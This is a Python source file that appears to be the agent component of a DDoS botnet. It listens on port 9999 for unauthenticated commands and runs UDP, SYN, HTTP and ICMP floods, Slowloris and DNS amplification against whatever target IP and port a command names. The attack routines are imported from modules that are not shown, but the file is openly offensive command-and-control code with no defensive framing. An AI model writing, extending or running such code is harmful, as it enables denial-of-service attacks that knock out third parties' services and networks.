import socket
import threading
from attacks import udp_flood, syn_flood, http_flood, icmp_flood, slowloris, dns_amplification
from app.logger import log_attack

def handle_command(command):
    try:
        attack_type, target_ip, target_port, duration, intensity = command.split(':')
        target_port = int(target_port)
        duration = int(duration)
        intensity = int(intensity)

        if attack_type == "UDP Flood":
            udp_flood.attack(target_ip, target_port, duration, intensity, log_attack)
        elif attack_type == "SYN Flood":
            syn_flood.attack(target_ip, target_port, duration, intensity, log_attack)
        elif attack_type == "HTTP Flood":
            http_flood.attack(target_ip, target_port, duration, intensity, log_attack)
        elif attack_type == "ICMP Flood":
            icmp_flood.attack(target_ip, target_port, duration, intensity, log_attack)
        elif attack_type == "Slowloris":
            slowloris.attack(target_ip, target_port, duration, intensity, log_attack)
        elif attack_type == "DNS Amplification":
            dns_amplification.attack(target_ip, target_port, duration, intensity, log_attack)
    except Exception as e:
        print(f"Error executing command: {e}")

def start_slave():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 9999))
    sock.listen(5)
    print("Slave listening for commands...")

    while True:
        client, addr = sock.accept()
        command = client.recv(1024).decode()
        threading.Thread(target=handle_command, args=(command,)).start()

if __name__ == "__main__":
    start_slave()